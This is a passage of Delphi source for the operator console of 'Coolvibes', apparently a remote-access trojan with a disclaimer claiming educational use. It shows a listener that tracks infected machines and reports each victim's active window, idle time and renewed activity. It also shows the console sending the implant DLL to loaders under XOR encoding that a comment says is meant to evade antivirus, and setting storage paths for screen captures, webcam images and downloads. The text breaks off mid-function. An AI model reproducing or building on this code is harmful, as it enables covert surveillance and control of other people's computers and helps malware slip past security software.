(*  Coolvibes - Herramienta de administraci�n remota

   Este c�digo fuente se ofrece s�lo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo due�o sea una persona diferente de usted, a no ser
   que el due�o haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes ser� responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

   El equipo del Coolvibes
*)

//Config del release
{$define CommDebug}

unit UnitMain;

interface

uses
  Windows, ShellAPI, Messages, SysUtils, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, XPMan, ComCtrls, Buttons,
  Menus, IniFiles, IdThreadMgrDefault,
  IdAntiFreeze, IdTCPServer,
  UnitVariables, gnugettext, CommCtrl, MMSystem, IdThreadMgr,
  IdAntiFreezeBase, IdBaseComponent, IdComponent, ImgList, jpeg, UnitPlugins, UnitFunciones,
  StdCtrls;

const
  WM_POP_MESSAGE = WM_USER + 1; //Mensaje usado para las notificaciones
  WM_ICONTRAY = WM_USER + 2; //Mensaje usado para el icono en el system tray
  WM_EVENT_MESSAGE = WM_USER + 3; //Mensaje usado para los eventos

//Globo emergente de notificaci�n
  NIF_INFO = $10;
  NIF_MESSAGE = 1;
  NIF_ICON = 2;
  NOTIFYICON_VERSION = 3;
  NIF_TIP = 4;
  NIM_SETVERSION = $00000004;
  NIM_SETFOCUS = $00000003;
  NIIF_INFO = $00000001;
  NIIF_WARNING = $00000002;
  NIIF_ERROR = $00000003;

type
  TDUMMYUNIONNAME = record
    case Integer of
      0: (uTimeout: UINT);
      1: (uVersion: UINT);
  end;
  TNotifyIconData = record
    cbSize: DWORD;
    Wnd: HWND;
    uID: UINT;
    uFlags: UINT;
    uCallbackMessage: UINT;
    hIcon: HICON;
    szTip: array[0..127] of char;
    dwState: DWORD;
    dwStateMask: DWORD;
    szInfo: array[0..255] of char;
    DUMMYUNIONNAME: TDUMMYUNIONNAME;
    szInfoTitle: array[0..63] of char;
    dwInfoFlags: DWORD;
  end;
//Termina const globo emergente


type
  TFormMain = class(TForm)
    StatusBar: TStatusBar;
    XPManifest: TXPManifest;
    PopupMenuConexiones: TPopupMenu;
    Abrir1: TMenuItem;
    N1: TMenuItem;
    Ping1: TMenuItem;
    Cambiarnombre1: TMenuItem;
    ImageList: TImageList;
    ListViewConexiones: TListView;
    ServerSocket: TIdTCPServer;
    IdAntiFreeze1: TIdAntiFreeze;
    IdThreadMgrDefault1: TIdThreadMgrDefault;
    PopupMenuTray: TPopupMenu;
    MostrarOcultar1: TMenuItem;
    Acercade1: TMenuItem;
    N2: TMenuItem;
    Escuchar1: TMenuItem;
    Salir1: TMenuItem;
    N3: TMenuItem;
    wwwindetectablesnet1: TMenuItem;
    Notificaciones: TMenuItem;
    TimerMandarPing: TTimer;
    PopupMenuColumnas: TPopupMenu;
    Ip1: TMenuItem;
    Nombre1: TMenuItem;
    CPU1: TMenuItem;
    SO1: TMenuItem;
    Versin1: TMenuItem;
    Ping2: TMenuItem;
    Ventanaactiva1: TMenuItem;
    su1: TMenuItem;
    Encendidohace1: TMenuItem;
    Idioma1: TMenuItem;
    Puerto1: TMenuItem;
    Cerrar1: TMenuItem;
    Actualizar1: TMenuItem;
    Desinstalar1: TMenuItem;
    UsuarioPC1: TMenuItem;
    Accesorpido1: TMenuItem;
    Capturapantalla1: TMenuItem;
    Avisarcuando1: TMenuItem;
    VuelvaaaveractividadenelPC1: TMenuItem;
    Cambiedeventana1: TMenuItem;
    Avisos1: TMenuItem;
    Abrirdirectoriousuario1: TMenuItem;
    Plugins: TMenuItem;
    N5: TMenuItem;
    N6: TMenuItem;
    N4: TMenuItem;
    Apagar1: TMenuItem;
    Cerrarsesin1: TMenuItem;
    Reiniciar1: TMenuItem;
    Suspender1: TMenuItem;
    Hibernar1: TMenuItem;
    MenuPrincipal: TMainMenu;
    Opciones1: TMenuItem;
    Configurarservidor1: TMenuItem;
    Escuchar2: TMenuItem;
    Acercade2: TMenuItem;
    GroupBoxPanel: TGroupBox;
    SpeedButton1: TSpeedButton;
    LabelInfo: TLabel;
    ImageDesktop: TImage;
    SpeedButtonAvisarActividad: TSpeedButton;
    SpeedButtonAvisarCambioVentana: TSpeedButton;
    Splitter: TSplitter;
    SpeedButtonCarpetaUser: TSpeedButton;
    procedure BtnEscucharClick(Sender: TObject);
    procedure ListViewConexionesContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
    procedure Abrir1Click(Sender: TObject);
    procedure Cambiarnombre1Click(Sender: TObject);
    procedure Ping1Click(Sender: TObject);
    procedure LeerArchivoINI();
    procedure GuardarArchivoINI();
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ServerSocketConnect(AThread: TIdPeerThread);
    procedure ServerSocketExecute(AThread: TIdPeerThread);
    procedure ServerSocketDisconnect(AThread: TIdPeerThread);
    procedure ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListViewConexionesCompare(Sender: TObject; Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure MostrarOcultar1Click(Sender: TObject);
    procedure Salir1Click(Sender: TObject);
    procedure wwwindetectablesnet1Click(Sender: TObject);
    procedure TimerMandarPingTimer(Sender: TObject);
    procedure GloboEmergente(titulo: string; mensaje: string; tipo: Cardinal);
    procedure ListViewConexionesKeyPress(Sender: TObject; var Key: Char);
    procedure ListViewConexionesColumnRightClick(Sender: TObject; Column: TListColumn; Point: TPoint);
    procedure PopupMenuColumnasPopup(Sender: TObject);
    procedure Ip1Click(Sender: TObject);
    procedure CheckMesg(var aMesg: TMessage);
    function GetIndex(aNMHdr: pNMHdr): Integer;
    function SearchColumnById(ID: Integer): Integer;
    procedure Cerrar1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Actualizar1Click(Sender: TObject);
    procedure StatusBarMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
    procedure StatusBarClick(Sender: TObject);
    procedure Capturapantalla1Click(Sender: TObject);
    procedure VuelvaaaveractividadenelPC1Click(Sender: TObject);
    procedure Cambiedeventana1Click(Sender: TObject);
    procedure Abrirdirectoriousuario1Click(Sender: TObject);
    procedure PluginClick(Sender: TObject);
    procedure NotificacionesClick(Sender: TObject);
    procedure Apagar1Click(Sender: TObject);
    procedure Cerrarsesin1Click(Sender: TObject);
    procedure Reiniciar1Click(Sender: TObject);
    procedure Suspender1Click(Sender: TObject);
    procedure Hibernar1Click(Sender: TObject);
    procedure Opciones1Click(Sender: TObject);
    procedure Acercade2Click(Sender: TObject);
    procedure Configurarservidor1Click(Sender: TObject);
    procedure Escuchar2Click(Sender: TObject);
    procedure ImageDesktopClick(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure ListViewConexionesSelectItem(Sender: TObject;
      Item: TListItem; Selected: Boolean);
    procedure SpeedButtonAvisarActividadClick(Sender: TObject);
    procedure SplitterMoved(Sender: TObject);
    procedure SpeedButtonAvisarCambioVentanaClick(Sender: TObject);
    procedure ServerSocketException(AThread: TIdPeerThread;
      AException: Exception);
    procedure SpeedButtonCarpetaUserClick(Sender: TObject);
  private
    ColumnaOrdenada, Columna: Integer;
    WndMethod: TWndMethod;
    //Para saber por que columna est� ordenado el listviewconexiones
    TrayIconData: TNotifyIconData;
    //El record donde se guarda la informaci�n del icono del tray
    ServerSockets: array[0..9] of TIdTCPServer;
    NumeroConexiones: Integer;  //El n�mero de servidores que hay conectados
    procedure OnPopMessage(var Msg: TMessage); message WM_POP_MESSAGE;
    procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
    procedure OnEventReceive(var Msg: TMessage); message WM_EVENT_MESSAGE;
    procedure NotiMsnDesconect(tItem: TListItem);
    function CrearVentanaControl(Item: TListitem): TObject; //Crea un Centro de control para el item seleccionado
  public
    Idioma: string; //El idioma actual
    Columnas: array[0..8] of string; //Para saber el orden de las columnas
    NotificandoOnline: Boolean; //Si estamos notificando alguna conexi�n
    ControlWidth, ControlHeight: Integer; //Anchura y altura de FormControl para guardar al archivo ini
    procedure Traducir();
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormCloseQueryMinimizarAlTray(Sender: TObject; var CanClose: Boolean);
    procedure MinimizeToTrayClick(Sender: TObject);
  end;

var
  FormMain: TFormMain;
  PrimeraVezQueMeMuestro: Boolean = True;
  ServDLL: string; //DLL del server, coolserver.dll

const
  Banderas: array[0..246] of string = ('ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg',
    'bh', 'bi', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'catalonia', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co',
    'cr', 'cs', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'ee', 'eg', 'eh', 'england', 'er', 'es', 'et', 'europeanunion', 'fam', 'fi', 'fj',
    'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht',
    'hu', 'id', 'ie', 'il', 'in', 'io', 'iq', 'ir', 'is', 'it', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc',
    'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw',
    'mx', 'my', 'mz', 'na', 'nc', 'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'ps',
    'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'scotland', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'sv',
    'sy', 'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've',
    'vg', 'vi', 'vn', 'vu', 'wales', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw');

implementation

uses
  UnitOpciones,
  UnitAbout,
  UnitID,
  UnitFormConfigServer,
  UnitFormLanguage,
  UnitFormControl,
  UnitFormNotifica,
  UnitEstadisticasConexiones,
  ScreenMaxCap, UnitFormSplash;

{$R *.dfm}

procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  GuardarArchivoINI();

  if ServerSocket.Active then
    Escuchar2.Click;
  Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
  ListViewConexiones.WindowProc := WndMethod;
  exitprocess(0);
end;

procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  case MessageBox(Handle, '�Est� seguro que desea salir?', 'Confirmaci�n',
    mb_IconQuestion + Mb_YesNo) of
    idNo: CanClose := False;
  end;
end;

procedure TFormMain.FormCloseQueryMinimizarAlTray(Sender: TObject;
  var CanClose: Boolean);
begin
  MinimizeToTrayClick(Sender);
  CanClose := False;
end;
//Fin de eventos del Formulario

//Eventos de los botones del Formulario
procedure TFormMain.BtnEscucharClick(Sender: TObject);
begin

end;
//Fin de los eventos de los botones del Formulario

//Evento que se ejecuta al recibir el mensaje WM_EVENT_MESSAGE, para los eventos: Nueva conexion, intento de conexion, desconexion...
procedure TFormMain.OnEventReceive(var Msg: TMessage);
var
  Tipo: Integer;
  Item: Tlistitem;
begin
  Tipo := (Msg.wParam);
  Item := TListItem(Msg.lParam);
  FormEstadisticasConexiones.NuevoEvento(Tipo, Item);
end;

//Evento que se ejecuta al recibir el mensaje WM_POP_MESSAGE, para las notificaciones
procedure TFormMain.OnPopMessage(var Msg: TMessage);
var
  Mensaje: string;
  Item: TListItem;
begin
  //Para que no aparezca mas de una al mismo tiempo
  //if not NotificandoOnline then
  //begin
  //NotificandoOnline := True;
  item := TListItem(Msg.wParam);
  Mensaje := _('La IP es :') + Item.SubItems[0];
  GloboEmergente(Item.Caption, Mensaje, NIIF_INFO);
  //end;
end;

//Eventos del ServerSocket
{
Nueva conexi�n desde el servidor, puede ser tanto una conexi�n principal
como una conexi�n secundaria para las funciones captura de pantalla,
webcam, transferencia de archivos...
}
procedure TFormMain.ServerSocketConnect(AThread: TIdPeerThread);
begin
  AThread.Connection.MaxLineLength := 1024 * 1024; //Long Max linea
  try
  ConnectionWriteLn(AThread, 'MAININFO|' + IntToStr(Athread.Handle));
  except
  end;
end;

procedure TFormMain.ServerSocketDisconnect(AThread: TIdPeerThread);
var
  item: TListItem;
  i : integer;
begin
  if Athread.Data <> nil then
    begin
      NumeroConexiones := NumeroConexiones-1;
      item := TListItem(Athread.Data);

      if item.SubItems.Objects[1] <> nil then
        begin
          //Avisamos a los plugins que han sido cargados que el servidor se ha desconectado
          for i:=0 to (item.SubItems.Objects[1] as TFormControl).NumeroPlugins-1 do
            (item.SubItems.Objects[1] as TFormControl).Plugins[i].Desconectado();
          if FormOpciones.CheckBoxCerrarControlAlDesc.Checked then
            begin
              (item.SubItems.Objects[1] as TFormControl).Close;
              (item.SubItems.Objects[1] as TFormControl).Free;
            end
          else
            begin
              (item.SubItems.Objects[1] as TFormControl).Caption := (item.SubItems.Objects[1] as TFormControl).Caption + ' ' + _('DESCONECTADO');
            end;
        end;
      if FormOpciones.CheckBoxNotiMsnDesc.Checked and not DesactivarNotificaciones then
        begin
          // si la opcion esta checkeado mandamos al globo emergente el item
          NotiMsnDesconect(item);
        end;
      SendMessage(FormMain.Handle, WM_EVENT_MESSAGE, 1, Integer(Item));
      TListItem(Athread.Data).Delete;

    end;

  try
    Athread.Connection.Server.Threads.LockList.Remove(Athread);
  finally
    Athread.Connection.Server.Threads.UnlockList();
  end;

  FormEstadisticasConexiones.LabelNConexiones.Caption := _('N�mero de conexiones: ') + IntToStr(NumeroConexiones);
  StatusBar.Panels[0].Text := _('N�mero de conexiones: ') + IntToStr(NumeroConexiones);
end;

procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
var
  Len, i, Ping: Integer;
  Item: TListItem;
  Buffer: AnsiString;
  Recibido, IP: string;
  SHP: HWND;
  TmpServDLL: string;
  Fmt: TFormatSettings;
  SoundNotification: string;

begin
  try
    Buffer := (ConnectionReadLn(Athread, #10#15#80#66#77#1#72#87));
  except
    Athread.Connection.Disconnect;
    Exit;
  end;
  Len := Length(Buffer);
  {$ifdef CommDebug}OutputDebugString(PChar('Client IN: ' + Buffer));{$endif}

  if Buffer = 'CONNECTED?' then
    Exit //Lo ignoramos
  else if Buffer = 'PING' then
    begin
      ConnectionWriteLn(AThread, 'PONG');
    end
  else if Copy(Buffer, 1, 9) = 'GETSERVER' then //Conectador.dll nos est� pidiendo el servidor
    begin //GETSERVER|clavecifrado1|clavecifrado2|
      Recibido := buffer;
      Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el GETSERVER|
      TmpServDLL := ServDll;
      if FormOpciones.CheckBoxGloboalPedirS.Checked then
        GloboEmergente(_('Pidiendo Servidor'), _('IP:') + ' ' + Athread.Connection.Socket.Binding.PeerIP, NIIF_INFO);

      for i := 1 to Length(ServDLL) do //con la primera clave
        TmpServDLL[i] := chr(Ord(TmpServDLL[i]) xor StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1))); //Cifrado simple para evadir antivirus
      Delete(Recibido, 1, Pos('|', Recibido));
      for i := 1 to Length(ServDLL) do
        TmpServDLL[i] := chr(Ord(TmpServDLL[i]) xor StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1))); //Cifrado simple para evadir antivirus

      ConnectionWrite(AThread, #14 + IntToStr(Length(TmpServDLL)) + #14 + TmpServDLL);
    end
  else if Copy(Buffer, 1, 4) = 'PONG' then
    begin
      Item := TListItem(Athread.Data);
      {SubItems[n]
       0 - IP
       1 - CPU
       2 - SO
       3 - Versi�n
       4 - Ping
       5 - Ventana activa
       6 - TSU
       7 - Encendido hace
       8 - Idioma
       9 - Puerto
      10 - Usuario / PC
      11 - Avisos}

      //GetTickCount -> ms. transcurridos desde el arranque del SO
      Ping := GetTickCount() - Cardinal(Item.SubItems.Objects[2]); //Tiempo actual menos almacenado

      Recibido := Buffer;
      Delete(Recibido, 1, Pos('|', Recibido)); //Quitamos el PONG

      Item.SubItems[4] := IntToStr(Ping); //Ping

      if Item.SubItems[5] <> Copy(Recibido, 1, Pos('|', Recibido) - 1) then
        if (Pos('V', Item.SubItems[11]) > 0) and not DesactivarNotificaciones then
          GloboEmergente(_('Cambio de Ventana: ') + Item.Caption, Copy(Recibido, 1, Pos('|', Recibido) - 1), NIIF_INFO);

      Item.SubItems[5] := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Ventana activa
      Delete(Recibido, 1, Pos('|', Recibido));

      //Formato regional fecha/hora para evitar errores con StrToDateTime
      Fmt.ShortDateFormat := 'dd/mm/yyyy';
      Fmt.DateSeparator := '/';
      Fmt.LongTimeFormat := 'hh:nn:ss';
      Fmt.TimeSeparator := ':';
      if StrToDateTime(Item.subitems[6], Fmt) > StrToDateTime(Copy(Recibido, 1, Pos('|', Recibido) - 1), Fmt) then
        if (Pos('A', Item.SubItems[11]) > 0) and not DesactivarNotificaciones then
          GloboEmergente(_('Actividad detectada'), Item.Caption, NIIF_INFO);

      // TSU -> GetIdleTime -> ms. que el SO ha estado inactivo (se pone a 0 en cuanto el SO tiene actividad
      Item.SubItems[6] := Copy(Recibido, 1, Pos('|', Recibido) - 1); //TSU
      Delete(Recibido, 1, Pos('|', Recibido));

      Item.SubItems[7] := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Encendido hace
      Delete(Recibido, 1, Pos('|', Recibido));

      Exit;
    end;

  {Si llega aqu� es que el SocketHandle no se encontr� entre los SocketHandles
   de las conexiones principales y una de dos:
   -Es un nuevo server
   -Es una conexi�n para la transferencia de ficheros
   -Es una conexi�n para la captura de pantalla
   }

  {Es un nuevo servidor, recibimos la informaci�n principal del server
   para mostrar en el ListViewConexiones}
  if Copy(Buffer, 1, 8) = 'MAININFO' then
    begin
      NumeroConexiones := NumeroConexiones+1;
      FormEstadisticasConexiones.LabelNConexiones.Caption := _('N�mero de conexiones: ') + IntToStr(NumeroConexiones);
      StatusBar.Panels[0].Text := _('N�mero de conexiones: ') + IntToStr(NumeroConexiones);

      Recibido := Copy(PChar(Buffer), 1, len);
      Delete(Recibido, 1, 9); //Borramos MAININFO|

      //A�adimos el server al ListviewConexiones
      item := ListViewConexiones.Items.Add;
      for i := 0 to listviewconexiones.columns.Count - 1 do
        item.SubItems.Add('?'); //A�adimos los subitems necesarios

      //El primer Objeto que guardamos en el Item es el Athread
      item.SubItems.Objects[0] := Athread;
      //Como segundo objeto guardaremos la Form
      //Y el tercer objeto le usaremos para guardar el TimeCount del ping

      Athread.Data := item;

      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1); //El nombre

      for i := 0 to listviewconexiones.columns.Count - 1 do //El resto de valores los copiamos tal cual
        begin
          Delete(Recibido, 1, Pos('|', Recibido));
          if i = 0 then //S�lo nos envia la ip local, as� que agregamos la publica
            Recibido := Athread.Connection.Socket.Binding.PeerIP + ' / ' + Recibido
          else if i = 9 then //Puerto
            Recibido := IntToStr(Athread.Connection.Server.DefaultPort) + '|' + Recibido;
          Item.SubItems[i] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        end;

      Recibido := Item.SubItems[8]; //Idioma
      Delete(Recibido, 1, Pos('_', Recibido));

      item.ImageIndex := 77; //bandera de famfamfam

      for i := 0 to 246 do //Buscamos la bandera que le corresponde a ese idioma
        if banderas[i] = lowercase(Recibido) then
          item.ImageIndex := i + 7;

      //ConnectionWriteLn(AThread, 'GETSH|'+IntToStr(AThread.Handle));
      //Mostramos la notificaci�n
      Recibido := '';
      if Formopciones.CheckBoxNotificacionMsn.Checked and not DesactivarNotificaciones then
        SendMessage(FormMain.Handle, WM_POP_MESSAGE, Integer(Item), 0);

      //Alerta sonora
      if FormOpciones.CheckBoxAlertaSonora.Checked and not DesactivarNotificaciones then
      begin
        SoundNotification := Formopciones.EditRutaArchivoWav.Text;
        SoundNotification := StringReplace(SoundNotification, '%cooldir%', extractfiledir(ParamStr(0)), [rfReplaceAll, rfIgnoreCase]);
        if fileexists(SoundNotification) then
        begin
          sndPlaySound(nil, 0); //Paramos el anterior si est� sonando
          sndPlaySound(PChar(SoundNotification), SND_NODEFAULT or SND_ASYNC);
        end;
      end;

      //Mandamos el evento de nueva conexion
      SendMessage(FormMain.Handle, WM_EVENT_MESSAGE, 0 {0=nueva conexi�n}, Integer(Item));
    end
      {Si llega aqu� es que es una conexi�n de transferencia, con SH|12345, se recibe el SocketHandle
      que relacciona esta conexi�n de transferencia con la conexi�n principal}
  else if Copy(PChar(Buffer), 1, 3) = 'SH|' then
    begin
      Recibido := Copy(PChar(Buffer), 1, len);
      Delete(Recibido, 1, 3); // 'SH|12345'
      //En recibido tenemos el SocketHandle de la conexi�n principal
      SHP := HWND(StrToInt(Recibido));
      //Buscamos el item de la conexi�n principal y le a�adimos el Handle del socket para las transferencias
      for i := 0 to ListViewConexiones.Items.Count - 1 do
        if SHP = TIdPeerThread(ListViewConexiones.Items.Item[i].SubItems.Objects[0]).Handle then
          begin
            item := ListViewConexiones.Items[i];
            //Enviarle la conexi�n a la ventana de ese item, si la tiene
            if item.SubItems.Objects[1] <> nil then
              begin
                (item.SubItems.Objects[1] as TFormControl).OnReadFile(Athread);
              end;
            Exit;
          end;

    end;

  //Buscamos a que item corresponde la conexi�n
  for i := 0 to ListViewConexiones.Items.Count - 1 do
    if ListViewConexiones.Items[i] <> nil then
      if ListViewConexiones.Items[i].SubItems.Objects[0] <> nil then
        if Athread.Handle = TIdPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]).Handle then
          begin
            item := ListViewConexiones.Items[i];
            //Enviarle la conexi�n a la ventana de ese item, si la tiene
            if item.SubItems.Objects[1] <> nil then
              begin
                (item.SubItems.Objects[1] as TFormControl).OnRead(Buffer, Athread);
                Exit;
              end;
            Exit;
          end;

  
end;
//Fin de eventos del ServerSocket

procedure TFormMain.ListViewConexionesContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
  Status: Boolean;
begin
  if ListViewConexiones.Selected = nil then
    Status := False //No se ha seleccionado item, deshabilitar menu
  else
    Status := True;
  for i := 0 to PopupMenuConexiones.Items.Count - 1 do
    PopupMenuConexiones.Items[i].Enabled := Status;

end;

//Al dar al boton abrir
procedure TFormMain.Abrir1Click(Sender: TObject);
var
  VentanaControl: TFormControl;
  mslistviewitem: TListItem;
begin
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
      VentanaControl.Show;
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Ping1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin
  mslistviewitem := ListViewConexiones.Selected;

  while Assigned(mslistviewitem) do
    begin
        if (mslistviewitem.SubItems[4] <> '.') then
        begin
            AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
            ConnectionWriteLn(AThread, 'PING');
            //Como objeto 2 guardamos una captura del tiempo en milisegundos
            mslistviewitem.SubItems.Objects[2] := TObject(GetTickCount());
        end;
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Cambiarnombre1Click(Sender: TObject);
begin
  FormID.ShowModal;
end;

//Al pulsar en la columna del ListViewConexiones ordenar filas seg�n el valor de esa columna
procedure TFormMain.ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
begin
{  Columna := Column.Index;

  ListViewConexiones.AlphaSort;
  //Para acordarnos de que columna est� ordenada

  if Columna <> ColumnaOrdenada then
    ColumnaOrdenada := Columna
  else
    ColumnaOrdenada := -1; }
end;

//Para ordenar el ListViewConexiones
procedure TFormMain.ListViewConexionesCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then //Si Columna = 0 usar Item.Caption
    begin
      Str1 := Item1.Caption;
      Str2 := Item2.Caption;
    end
  else
    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
      Str1 := Item1.SubItems[Columna - 1];
      Str2 := Item2.SubItems[Columna - 1];
    end;
  if (Columna in [0..4]) or (Columna in [6..10]) then //Son tratadas como cadenas
    Compare := CompareText(Str1, Str2)
  else //Columna 5 tratada como n�mero
    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
  //Si la columna ya fue ordenada anteriormente, invertir el orden
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1; //Invertimos el resultado
end;

//Funciones para leer y guardar la configuraci�n en el archivo .INI
procedure TFormMain.LeerArchivoINI();
var
  Ini: TIniFile;
  i: Integer;
  c: TListColumn;
  TempStr: string;
  itm : Tlistitem;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');

    //Valores de la Form de Opciones
    with FormOpciones do
      begin
       {Los plugins predeterminados}
        Plugins := Ini.ReadString('Opciones', 'Plugins',
                    '%CoolDir%\Recursos\Plugins\Bromas\BromasC.dll' + '|' +
                    '%CoolDir%\Recursos\Plugins\InstalledApplications\InstalledApplicationsC.dll' + '|' +
                    '%CoolDir%\Recursos\Plugins\Mensajes\MensajesC.dll' + '|');
        EditPuerto.Text :=
          Ini.ReadString('Opciones', 'PuertoEscucha', '3360;77');
        CheckBoxPreguntarAlSalir.Checked :=
          Ini.ReadBool('Opciones', 'PreguntarSalir', True);
        CheckBoxNotificacionMsn.Checked :=
          Ini.ReadBool('Opciones', 'NotificacionMsn', True);
        CheckBoxNotiMsnDesc.Checked :=
          Ini.ReadBool('Opciones', 'NotiMsnServerDesc', True);
        CheckBoxMinimizeToTray.Checked :=
          Ini.ReadBool('Opciones', 'MinimizarAlTray', False);
        CheckBoxCloseToTray.Checked :=
          Ini.ReadBool('Opciones', 'CerrarAlTray', False);
        CheckBoxEscucharAlIniciar.Checked :=
          Ini.ReadBool('Opciones', 'EscucharAlIniciar', False);
        CheckBoxMandarPingAuto.Checked :=
          Ini.ReadBool('Opciones', 'MandarPingAuto', True);
        EditPingTimerInterval.Text :=
          Ini.ReadString('Opciones', 'PingTimerInterval', '30');
        CheckBoxAutoRefrescar.Checked :=
          Ini.ReadBool('Opciones', 'AutoRefrescar', False);
        CheckBoxCerrarControlAlDesc.Checked :=
          Ini.ReadBool('Opciones', 'CerrarControlAlDesconectar', False);
        CheckBoxGloboalPedirS.Checked :=
          Ini.ReadBool('Opciones', 'GloboAlPedirServidor', True);
        CheckBoxAlertaSonora.Checked :=
          Ini.ReadBool('Opciones', 'AlertaSonora', True);
        EditRutaArchivoWav.Text :=
          Ini.ReadString('Opciones', 'AlertaSonoraPath', '%CoolDir%\Recursos\Sonidos\default.wav');
        CheckBoxCCIndependiente.Checked :=
          Ini.ReadBool('Opciones', 'CControlIndependiente', False);
        LabeledEditDirUser.Text := Ini.ReadString('Opciones', 'PathUsuario', '%CoolDir%\Usuarios\%Identificator%\');
        LabeledDirScreen.Text := Ini.ReadString('Opciones', 'PathCapturas', '%CoolDir%\Usuarios\%Identificator%\Capturas\');
        LabeledDirWebcam.Text := Ini.ReadString('Opciones', 'PathWebcam', '%CoolDir%\Usuarios\%Identificator%\Webcam\');
        LabeledDirThumbs.Text := Ini.ReadString('Opciones', 'PathMiniaturas', '%CoolDir%\Usuarios\%Identificator%\Miniaturas\');
        LabeledDirDownloads.Text := Ini.ReadString('Opciones', 'PathDescargas', '%CoolDir%\Usuarios\%Identificator%\Descargas\');
        CheckBoxGuardarPluginsEnDisco.Checked := Ini.ReadBool('Opciones', 'GuardarPluginsADisco', True);
        CheckBoxIncluirTreeView.Checked := Ini.ReadBool('Opciones', 'IncluirTreeViewArchivos', True);
        CheckBoxTreeViewCC.Checked := Ini.ReadBool('Opciones', 'IncluirTreeViewCC', True);
        CheckBoxAyuda1.Checked := Ini.ReadBool('Opciones', 'CheckBoxAyuda1', True);
        CheckBoxAyuda2.Checked := Ini.ReadBool('Opciones', 'CheckBoxAyuda2', True);
        CheckBoxAyuda3.Checked := Ini.ReadBool('Opciones', 'CheckBoxAyuda3', True);
        CheckBoxPanelInferior.Checked := Ini.ReadBool('Opciones', 'MostrarPanelInferior', False);
        CheckBoxCapturaInferior.Checked := Ini.ReadBool('Opciones', 'CapturaInferior', False);
        CheckBoxSplash.Checked := Ini.ReadBool('Opciones', 'Splash', True);
      end;

      //a�adimos los plugins al listview
      Tempstr := FormOpciones.Plugins;
      FormOpciones.Plugins := '';
      while (pos('|', TempStr) > 0) do
      begin
